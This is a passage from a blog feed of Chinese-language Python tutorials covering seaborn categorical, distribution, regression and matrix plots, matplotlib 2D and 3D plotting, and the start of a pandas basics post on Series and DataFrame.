<h2 id="分类估计图"><a href="#分类估计图" class="headerlink" title="分类估计图"></a>分类估计图</h2><h3 id="点线图"><a href="#点线图" class="headerlink" title="点线图"></a>点线图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;sepal_length&quot;, y=&quot;species&quot;, kind=&quot;point&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/13.png" alt="pic"></p>
<h3 id="条形图"><a href="#条形图" class="headerlink" title="条形图"></a>条形图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;sepal_length&quot;, y=&quot;species&quot;, kind=&quot;bar&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/14.png" alt="pic"></p>
<h3 id="计数条形图"><a href="#计数条形图" class="headerlink" title="计数条形图"></a>计数条形图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;species&quot;, kind=&quot;count&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/15.png" alt="pic"></p>
<h1 id="0x04-分布图"><a href="#0x04-分布图" class="headerlink" title="0x04 分布图"></a>0x04 分布图</h1><p>可视化变量的分布情况，一般有单变量分布和多变量分布，这里的多变量多指二元变量。jointplot，pairplot，distplot，kdeplot。</p>
<h2 id="单变量的直方核密度估计图"><a href="#单变量的直方核密度估计图" class="headerlink" title="单变量的直方核密度估计图"></a>单变量的直方核密度估计图</h2><p><code>distplot</code>提供了参数来调整直方图和核密度估计图，eg设置 <code>kde=False</code>可以只绘制直方图，或者<code>hist=False</code>只绘制核密度估计图。<code>kdeplot</code>可以专门用于绘制核密度估计图，其效果和<code>distplot(hist=False)</code>一致，但<code>kdeplot</code>拥有更多的自定义设置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set()</span><br><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.distplot(iris[&quot;sepal_length&quot;])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.kdeplot(iris[&quot;sepal_length&quot;])</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/16.png" alt="pic"></p>
<h2 id="二元变量分布图"><a href="#二元变量分布图" class="headerlink" title="二元变量分布图"></a>二元变量分布图</h2><p>可以呈现<code>sepal_length</code>和<code>sepal_width</code>二元特征变量之间的关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set()</span><br><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.jointplot(x=&quot;sepal_length&quot;, y=&quot;sepal_width&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/17.png" alt="pic"></p>
<h2 id="二元变量回归拟合图"><a href="#二元变量回归拟合图" class="headerlink" title="二元变量回归拟合图"></a>二元变量回归拟合图</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.jointplot(x=&quot;sepal_length&quot;, y=&quot;sepal_width&quot;, data=iris, kind=&quot;reg&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/18.png" alt="pic"></p>
<h2 id="强大的pairplot"><a href="#强大的pairplot" class="headerlink" title="强大的pairplot"></a>强大的pairplot</h2><p>一次性将数据集中的特征变量两两对比绘图。默认情况下，对角线上是单变量分布图，而其他则是二元变量分布图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set()</span><br><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.pairplot(iris, hue=&quot;species&quot;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/19.png" alt="pic"></p>
<h1 id="0x05-回归图"><a href="#0x05-回归图" class="headerlink" title="0x05 回归图"></a>0x05 回归图</h1><p>绘制函数主要有：<code>lmplot</code>和<code>regplot</code><br><code>regplot</code>绘制回归图时，只需指定自变量和因变量就能自动拟合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set()</span><br><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.regplot(x=&quot;sepal_length&quot;, y=&quot;sepal_width&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/20.png" alt="pic"><br><code>lmplot</code>支持引入第三维度进行对比，eg设置 <code>hue=&quot;species&quot;</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set()</span><br><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.lmplot(x=&quot;sepal_length&quot;, y=&quot;sepal_width&quot;, hue=&quot;species&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/21.png" alt="pic"></p>
<h1 id="0x06-矩阵图"><a href="#0x06-矩阵图" class="headerlink" title="0x06 矩阵图"></a>0x06 矩阵图</h1><p>矩阵图中最常用的就只有2个，<code>heatmap</code>和<code>clustermap</code><br><code>heatmap</code>主要用来绘制热力图</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set()</span><br><span class="line">sns.heatmap(np.random.rand(10, 10))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/22.png" alt="pic"></p>
<h1 id="文献来源"><a href="#文献来源" class="headerlink" title="文献来源"></a>文献来源</h1><p>[1] <a href="https://www.shiyanlou.com/courses/892/learning/?id=3260" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/892/learning/?id=3260</a></p>
]]></content>
      <categories>
        <category>Numpy</category>
      </categories>
      <tags>
        <tag>Numpy</tag>
        <tag>Python</tag>
        <tag>seaborn</tag>
      </tags>
  </entry>
  <entry>
    <title>matplotlib-basic</title>
    <url>/2019/11/02/matplotlib-basic/</url>
    <content><![CDATA[<p>Matplotlib 图像绘制<br>Matplotlib 是Python语言的开源绘图库<br><a href="https://matplotlib.org/api/index.html" target="_blank" rel="noopener">官方文档</a></p>
<a id="more"></a>
<blockquote>
<p>说明:桌面环境下全部绘图代码之后追加<code>plt.show()</code>可以看到图形<br>使用前需要导入包<code>from matplotlib import pyplot as plt</code></p>
</blockquote>
<h1 id="0x00-二维图形绘制"><a href="#0x00-二维图形绘制" class="headerlink" title="0x00 二维图形绘制"></a>0x00 二维图形绘制</h1><h2 id="0x00-00-简单绘图"><a href="#0x00-00-简单绘图" class="headerlink" title="0x00_00 简单绘图"></a>0x00_00 简单绘图</h2><h3 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h3><p><code>plt.plot()</code>用来绘制折线图<br><a href="https://matplotlib.org/3.1.0/api/_as_gen/matplotlib.pyplot.plot.html" target="_blank" rel="noopener">官方文档</a></p>
<h4 id="默认横坐标"><a href="#默认横坐标" class="headerlink" title="默认横坐标"></a>默认横坐标</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y=[1, 2, 3, 2, 1, 2, 3, 4, 5, 6, 5, 4, 3, 2, 1]</span><br><span class="line">plt.plot(y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>列表中的值作为<code>y</code>值，横坐标从0自动递增<br><img src="/images/matplotlib-basic/01.png" alt="pic"></p>
<h4 id="自定义横坐标"><a href="#自定义横坐标" class="headerlink" title="自定义横坐标"></a>自定义横坐标</h4><p>传入两个列表参数就可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x=[2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]</span><br><span class="line">y=[1, 2, 3, 2, 1, 2, 3, 4, 5, 6, 5, 4, 3, 2, 1]</span><br><span class="line">plt.plot(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/02.png" alt="pic"></p>
<p>小例子，描点法生成一个正弦曲线</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"># 在 -2PI 和 2PI 之间等间距生成 1000 个值，也就是 X 坐标</span><br><span class="line">X = np.linspace(-2*np.pi, 2*np.pi, 1000)</span><br><span class="line"># 计算 y 坐标</span><br><span class="line">y = np.sin(X)</span><br><span class="line">plt.plot(X, y) # 向方法中 `*args` 输入 X，y 坐标</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/03.png" alt="pic"></p>
<h3 id="柱状图"><a href="#柱状图" class="headerlink" title="柱状图"></a>柱状图</h3><p>主要使用<code>plt.bar()</code>绘制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x=[1,2,3]</span><br><span class="line">y=[3,4,5]</span><br><span class="line">plt.bar(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/04.png" alt="pic"></p>
<h3 id="散点图"><a href="#散点图" class="headerlink" title="散点图"></a>散点图</h3><p>主要使用<code>scatter()</code>绘制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># X,y 的坐标均有 numpy 在 0 到 1 中随机生成 1000 个值</span><br><span class="line">X = np.random.ranf(100)</span><br><span class="line">y = np.random.ranf(100)</span><br><span class="line"># 向方法中 `*args` 输入 X，y 坐标</span><br><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/05.png" alt="pic"></p>
<h3 id="饼状图"><a href="#饼状图" class="headerlink" title="饼状图"></a>饼状图</h3><p>主要使用<code>pie()</code>绘制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data=[32,45,56]</span><br><span class="line">plt.pie(data)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/06.png" alt="pic"></p>
<h2 id="0x00-01定义图形样式"><a href="#0x00-01定义图形样式" class="headerlink" title="0x00_01定义图形样式"></a>0x00_01定义图形样式</h2><h3 id="折线图样式"><a href="#折线图样式" class="headerlink" title="折线图样式"></a>折线图样式</h3><p><a href="https://matplotlib.org/3.1.0/api/_as_gen/matplotlib.pyplot.plot.html" target="_blank" rel="noopener">官方文档</a><br>一些常见的参数样式</p>
<table>
<tr><th>参数</th><th>功能</th></tr>
<tr><td>alpha=</td><td>设置线的透明度[0,1]</td></tr>
<tr><td>color=</td><td>设置线型的颜色</td></tr>
<tr><td>fillstyle=</td><td>设置线型的填充样式</td></tr>
<tr><td>linestyle=</td><td>设置线型的样式</td></tr>
<tr><td>linewidth=</td><td>设置线型的宽度</td></tr>
<tr><td>marker=</td><td>设置标记点的样式</td></tr>
</table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在 -2PI 和 2PI 之间等间距生成 1000 个值，也就是 X 坐标</span><br><span class="line">X = np.linspace(-2 * np.pi, 2 * np.pi, 1000)</span><br><span class="line"># 计算 sin() 对应的纵坐标</span><br><span class="line">y1 = np.sin(X)</span><br><span class="line"># 计算 cos() 对应的纵坐标</span><br><span class="line">y2 = np.cos(X)</span><br><span class="line"># 向方法中 `*args` 输入 X，y 坐标</span><br><span class="line">plt.plot(X, y1, color=&apos;r&apos;, linestyle=&apos;--&apos;, linewidth=2, alpha=0.8)</span><br><span class="line">plt.plot(X, y2, color=&apos;b&apos;, linestyle=&apos;-&apos;, linewidth=2)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/07.png" alt="pic"></p>
<h3 id="散点图样式"><a href="#散点图样式" class="headerlink" title="散点图样式"></a>散点图样式</h3><p><a href="https://matplotlib.org/api/_as_gen/matplotlib.pyplot.scatter.html" target="_blank" rel="noopener">官方文档</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 生成随机数据</span><br><span class="line">x = np.random.rand(100)</span><br><span class="line">y = np.random.rand(100)</span><br><span class="line">colors = np.random.rand(100)</span><br><span class="line">size = np.random.normal(50, 60, 10)</span><br><span class="line">plt.scatter(x, y, s=size, c=colors)  # 绘制散点图</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/08.png" alt="pic"></p>
<h3 id="饼状图样式"><a href="#饼状图样式" class="headerlink" title="饼状图样式"></a>饼状图样式</h3><p><a href="https://matplotlib.org/api/_as_gen/matplotlib.pyplot.pie.html#matplotlib.pyplot.pie" target="_blank" rel="noopener">官方文档</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">label = &apos;Cat&apos;, &apos;Dog&apos;, &apos;Cattle&apos;, &apos;Sheep&apos;, &apos;Horse&apos;  # 各类别标签</span><br><span class="line">color = &apos;r&apos;, &apos;g&apos;, &apos;r&apos;, &apos;g&apos;, &apos;y&apos;  # 各类别颜色</span><br><span class="line">size = [1, 2, 3, 4, 5]  # 各类别占比</span><br><span class="line">explode = (0, 0, 0, 0, 0.2)  # 各类别的偏移半径</span><br><span class="line"># 绘制饼状图</span><br><span class="line">plt.pie(size, colors=color, explode=explode,</span><br><span class="line">        labels=label, shadow=True, autopct=&apos;%1.1f%%&apos;)</span><br><span class="line"># 饼状图呈正圆</span><br><span class="line">plt.axis(&apos;equal&apos;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/09.png" alt="pic"></p>
<h3 id="组合图样式"><a href="#组合图样式" class="headerlink" title="组合图样式"></a>组合图样式</h3><p>往往有时候把几个图形在一个界面一同画出来<br><strong>两张图的横坐标必须共享</strong>，这样才能够被 Matplotlib 自动判断为组合图</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19]</span><br><span class="line">y_bar = [3, 4, 6, 8, 9, 10, 9, 11, 7, 8]</span><br><span class="line">y_line = [2, 3, 5, 7, 8, 9, 8, 10, 6, 7]</span><br><span class="line"></span><br><span class="line">plt.bar(x, y_bar)</span><br><span class="line">plt.plot(x, y_line, &apos;-o&apos;, color=&apos;y&apos;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/10.png" alt="pic"></p>
<h2 id="0x00-02-定义图形位置"><a href="#0x00-02-定义图形位置" class="headerlink" title="0x00_02 定义图形位置"></a>0x00_02 定义图形位置</h2><p>需要调整图形的位置，或者把几张单独的图形拼接在一起，就需要引入 <code>plt.figure</code>图形对象</p>
<blockquote>
<p>把<code>plt.figure()</code>看成画板<br><code>axes</code>看成画布</p>
</blockquote>
<h3 id="自定义位置的图形"><a href="#自定义位置的图形" class="headerlink" title="自定义位置的图形"></a>自定义位置的图形</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.linspace(0, 10, 20)  # 生成数据</span><br><span class="line">y = x * x + 2</span><br><span class="line">fig = plt.figure()  # 新建图形对象</span><br><span class="line">#添加一个画布</span><br><span class="line">axes = fig.add_axes([0.1, 0.1, 0.8, 0.8])  # 控制画布的左, 下, 宽度, 高度</span><br><span class="line">axes.plot(x, y, &apos;r&apos;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/11.png" alt="pic"></p>
<h3 id="大图套小图"><a href="#大图套小图" class="headerlink" title="大图套小图"></a>大图套小图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.linspace(0, 10, 20)  # 生成数据</span><br><span class="line">y = x * x + 2</span><br><span class="line"></span><br><span class="line">fig = plt.figure()  # 新建画板</span><br><span class="line">axes1 = fig.add_axes([0.1, 0.1, 0.8, 0.8])  # 大画布</span><br><span class="line">axes2 = fig.add_axes([0.2, 0.5, 0.4, 0.3])  # 小画布</span><br><span class="line"></span><br><span class="line">axes1.plot(x, y, &apos;r&apos;)  # 大画布</span><br><span class="line">axes2.plot(y, x, &apos;g&apos;)  # 小画布</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/12.png" alt="pic"></p>
<h3 id="子图的绘制-多张图拼接在一起"><a href="#子图的绘制-多张图拼接在一起" class="headerlink" title="子图的绘制(多张图拼接在一起)"></a>子图的绘制(多张图拼接在一起)</h3><p>另外一种添加画布的方式<code>plt.subplots()</code>，它也是一个画布，返回一个元组(truple)数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fig, axes = plt.subplots()</span><br><span class="line">axes.plot(x, y, &apos;r&apos;)</span><br></pre></td></tr></table></figure>

<p>一个例子，拼接多张图片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.linspace(0, 10, 20)  # 生成数据</span><br><span class="line">y = x * x + 2</span><br><span class="line">fig, axes = plt.subplots(nrows=1, ncols=2)  # 子图为 1 行，2 列</span><br><span class="line">for ax in axes:</span><br><span class="line">    ax.plot(x, y, &apos;r&apos;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/13.png" alt="pic"></p>
<blockquote>
<p><strong>Tips：</strong><br>任何图形的绘制，都建议通过<code>plt.figure()</code> 或者<code>plt.subplots()</code>管理一个完整的图形对象。而不是简单使用一条语句，例如<code>plt.plot()</code>来绘图。</p>
</blockquote>
<h2 id="0x00-03-绘图规范"><a href="#0x00-03-绘图规范" class="headerlink" title="0x00_03 绘图规范"></a>0x00_03 绘图规范</h2><h3 id="添加图标题、图例"><a href="#添加图标题、图例" class="headerlink" title="添加图标题、图例"></a>添加图标题、图例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.linspace(0, 10, 20)  # 生成数据</span><br><span class="line">fig, axes = plt.subplots()</span><br><span class="line">axes.set_xlabel(&apos;x label&apos;)  # 横轴名称</span><br><span class="line">axes.set_ylabel(&apos;y label&apos;)</span><br><span class="line">axes.set_title(&apos;myTitle&apos;)  # 图形名称</span><br><span class="line">axes.plot(x, x**2)</span><br><span class="line">axes.plot(x, x**3)</span><br><span class="line">axes.legend([&quot;y = x**2&quot;, &quot;y = x**3&quot;], loc=0)  # 图例</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><code>loc</code>参数标记图例位置，1，2，3，4 依次代表：右上角、左上角、左下角，右下角；0 代表自适应<br><img src="/images/matplotlib-basic/14.png" alt="pic"></p>
<h3 id="线型、颜色、透明度"><a href="#线型、颜色、透明度" class="headerlink" title="线型、颜色、透明度"></a>线型、颜色、透明度</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.linspace(0, 10, 20)  # 生成数据</span><br><span class="line">fig, ax = plt.subplots(figsize=(12, 6))</span><br><span class="line"># 线宽</span><br><span class="line">ax.plot(x, x+1, color=&quot;blue&quot;, linewidth=0.25)</span><br><span class="line">ax.plot(x, x+2, color=&quot;blue&quot;, linewidth=0.50)</span><br><span class="line">ax.plot(x, x+3, color=&quot;blue&quot;, linewidth=1.00)</span><br><span class="line">ax.plot(x, x+4, color=&quot;blue&quot;, linewidth=2.00)</span><br><span class="line"></span><br><span class="line"># 虚线类型</span><br><span class="line">ax.plot(x, x+5, color=&quot;red&quot;, lw=2, linestyle=&apos;-&apos;)</span><br><span class="line">ax.plot(x, x+6, color=&quot;red&quot;, lw=2, ls=&apos;-.&apos;)</span><br><span class="line">ax.plot(x, x+7, color=&quot;red&quot;, lw=2, ls=&apos;:&apos;)</span><br><span class="line"></span><br><span class="line"># 虚线交错宽度</span><br><span class="line">line, = ax.plot(x, x+8, color=&quot;black&quot;, lw=1.50)</span><br><span class="line">line.set_dashes([5, 10, 15, 10])</span><br><span class="line"></span><br><span class="line"># 符号</span><br><span class="line">ax.plot(x, x + 9, color=&quot;green&quot;, lw=2, ls=&apos;--&apos;, marker=&apos;+&apos;)</span><br><span class="line">ax.plot(x, x+10, color=&quot;green&quot;, lw=2, ls=&apos;--&apos;, marker=&apos;o&apos;)</span><br><span class="line">ax.plot(x, x+11, color=&quot;green&quot;, lw=2, ls=&apos;--&apos;, marker=&apos;s&apos;)</span><br><span class="line">ax.plot(x, x+12, color=&quot;green&quot;, lw=2, ls=&apos;--&apos;, marker=&apos;1&apos;)</span><br><span class="line"></span><br><span class="line"># 符号大小和颜色</span><br><span class="line">ax.plot(x, x+13, color=&quot;purple&quot;, lw=1, ls=&apos;-&apos;, marker=&apos;o&apos;, markersize=2)</span><br><span class="line">ax.plot(x, x+14, color=&quot;purple&quot;, lw=1, ls=&apos;-&apos;, marker=&apos;o&apos;, markersize=4)</span><br><span class="line">ax.plot(x, x+15, color=&quot;purple&quot;, lw=1, ls=&apos;-&apos;,</span><br><span class="line">        marker=&apos;o&apos;, markersize=8, markerfacecolor=&quot;red&quot;)</span><br><span class="line">ax.plot(x, x+16, color=&quot;purple&quot;, lw=1, ls=&apos;-&apos;, marker=&apos;s&apos;, markersize=8,</span><br><span class="line">        markerfacecolor=&quot;yellow&quot;, markeredgewidth=2, markeredgecolor=&quot;blue&quot;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/15.png" alt="pic"></p>
<h3 id="网格和坐标轴范围"><a href="#网格和坐标轴范围" class="headerlink" title="网格和坐标轴范围"></a>网格和坐标轴范围</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.linspace(0, 10, 20)  # 生成数据</span><br><span class="line">fig, axes = plt.subplots(1, 2, figsize=(10, 5))</span><br><span class="line"></span><br><span class="line"># 显示网格</span><br><span class="line">axes[0].plot(x, x**2, x, x**3, lw=2)</span><br><span class="line">axes[0].grid(True)</span><br><span class="line"></span><br><span class="line"># 设置坐标轴范围</span><br><span class="line">axes[1].plot(x, x**2, x, x**3)</span><br><span class="line">axes[1].set_ylim([0, 60])</span><br><span class="line">axes[1].set_xlim([2, 5])</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/16.png" alt="pic"></p>
<h3 id="图形标注文字"><a href="#图形标注文字" class="headerlink" title="图形标注文字"></a>图形标注文字</h3><p>文字标注通过<code>matplotlib.pyplot.text()</code>实现。最基本的样式为 <code>matplotlib.pyplot.text(x, y, s)</code>，其中 x, y 用于标注位置定位，s 代表标注的字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fig, axes = plt.subplots()</span><br><span class="line">x_bar = [10, 20, 30, 40, 50]  # 柱形图横坐标</span><br><span class="line">y_bar = [0.5, 0.6, 0.3, 0.4, 0.8]  # 柱形图纵坐标</span><br><span class="line">bars = axes.bar(x_bar, y_bar, color=&apos;blue&apos;, label=x_bar, width=2)  # 绘制柱形图</span><br><span class="line">for i, rect in enumerate(bars):</span><br><span class="line">    x_text = rect.get_x()  # 获取柱形图横坐标</span><br><span class="line">    y_text = rect.get_height() + 0.01  # 获取柱子的高度并增加 0.01</span><br><span class="line">    plt.text(x_text, y_text, &apos;%.1f&apos; %y_bar[i])  # 标注文字</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/17.png" alt="pic"></p>
<h1 id="0x01-三维图形绘制"><a href="#0x01-三维图形绘制" class="headerlink" title="0x01 三维图形绘制"></a>0x01 三维图形绘制</h1><p>绘制三维图像主要通过<code>mplot3d</code>模块实现。但是，使用<code>Matplotlib</code> 绘制三维图像实际上是在二维画布上展示，所以一般绘制三维图像时，同样需要载入 pyplot 模块<br>导入包<code>from mpl_toolkits.mplot3d import Axes3D</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from mpl_toolkits.mplot3d import Axes3D</span><br><span class="line">import matplotlib.pyplot as plt</span><br></pre></td></tr></table></figure>

<h2 id="三维散点图"><a href="#三维散点图" class="headerlink" title="三维散点图"></a>三维散点图</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># x, y, z 均为 0 到 1 之间的 100 个随机数</span><br><span class="line">x = np.random.normal(0, 1, 100)</span><br><span class="line">y = np.random.normal(0, 1, 100)</span><br><span class="line">z = np.random.normal(0, 1, 100)</span><br><span class="line"></span><br><span class="line">fig = plt.figure()</span><br><span class="line"></span><br><span class="line">ax = Axes3D(fig)</span><br><span class="line">ax.scatter(x, y, z)</span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/18.png" alt="pic"></p>
<h2 id="三维线性图"><a href="#三维线性图" class="headerlink" title="三维线性图"></a>三维线性图</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 生成数据</span><br><span class="line">x = np.linspace(-6 * np.pi, 6 * np.pi, 1000)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">z = np.cos(x)</span><br><span class="line"># 创建 3D 图形对象</span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig)</span><br><span class="line">ax.plot(x, y, z)</span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/19.png" alt="pic"></p>
<h2 id="三维曲面图"><a href="#三维曲面图" class="headerlink" title="三维曲面图"></a>三维曲面图</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 生成数据</span><br><span class="line">X = np.arange(-2, 2, 0.1)</span><br><span class="line">Y = np.arange(-2, 2, 0.1)</span><br><span class="line">X, Y = np.meshgrid(X, Y)</span><br><span class="line">Z = np.sqrt(X ** 2 + Y ** 2)</span><br><span class="line"></span><br><span class="line"># 绘制曲面图，并使用 cmap 着色</span><br><span class="line">ax.plot_surface(X, Y, Z, cmap=plt.cm.winter)</span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>

<p><img src="/images/matplotlib-basic/20.png" alt="pic"></p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.shiyanlou.com/courses/1093/learning/?id=6141" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/1093/learning/?id=6141</a><br>[2] <a href="https://www.runoob.com/numpy/numpy-matplotlib.html" target="_blank" rel="noopener">https://www.runoob.com/numpy/numpy-matplotlib.html</a></p>
]]></content>
      <categories>
        <category>Numpy</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title>pandas-basic</title>
    <url>/2019/11/02/pandas-basic/</url>
    <content><![CDATA[<p>pandas数据处理的基本操作</p>
<a id="more"></a>
<p>Python进行数据预处理的库，基于Numpy，这里主要涉及到数据类型，读取，选择，删减，填充。<br>使用前导入库<code>import pandas as pd</code></p>
<h1 id="1-pandas数据类型"><a href="#1-pandas数据类型" class="headerlink" title="1. pandas数据类型"></a>1. pandas数据类型</h1><table>
<tr><th>dataType</th><th>说明</th><th>备注</th></tr>
<tr><td>Series</td><td>一维数组</td><td>常见</td></tr>
<tr><td>DataFrame</td><td>二维数组</td><td>常见</td></tr>
<tr><td>Panel</td><td>三维数组</td><td>不常见</td></tr>
</table>

<h2 id="1-1Series简介"><a href="#1-1Series简介" class="headerlink" title="1.1Series简介"></a>1.1Series简介</h2><p><a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Series.html" target="_blank" rel="noopener">官网</a><br>Pandas 中的一维数组，其可以储存整数、浮点数、字符串等类型的数据，它的结构如下所示。具有行索引。<br><code>pandas.Series(data=None, index=None)</code></p>
<h3 id="基于Python字典创建Series"><a href="#基于Python字典创建Series" class="headerlink" title="基于Python字典创建Series"></a>基于Python字典创建Series</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s = pd.Series(&#123;&apos;c1&apos;: 1, &apos;c2&apos;: 2, &apos;c3&apos;: 3&#125;)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/01.png" alt="pic01"></p>
<h3 id="基于NumPy一维ndarray数组创建"><a href="#基于NumPy一维ndarray数组创建" class="headerlink" title="基于NumPy一维ndarray数组创建"></a>基于NumPy一维ndarray数组创建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f =np.random.randn(5)</span><br><span class="line">print(f)</span><br><span class="line">s = pd.Series(f)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>

<p><img src="/images/pandas-basic/02.png" alt="pic02"><br><strong>注意：默认索引从0开始</strong></p>
<h2 id="1-2-DataFrame简介"><a href="#1-2-DataFrame简介" class="headerlink" title="1.2 DataFrame简介"></a>1.2 DataFrame简介</h2><p><a href="https://pandas.pydata.org/pandas-docs/stable/reference/frame.html" target="_blank" rel="noopener">官网</a><br>Pandas 中最为常见、最重要且使用频率最高的数据结构，与excel类似，二维表格，具有行列索引。<br>基本结构是这样的<code>pandas.DataFrame(data=None, index=None, columns=None)</code></p>
<h3 id="基于列表字典创建"><a href="#基于列表字典创建" class="headerlink" title="基于列表字典创建"></a>基于列表字典创建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;&apos;c1&apos;: [1, 2, 3],</span><br><span class="line">                   &apos;c2&apos;: [4, 5, 6]&#125;)</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

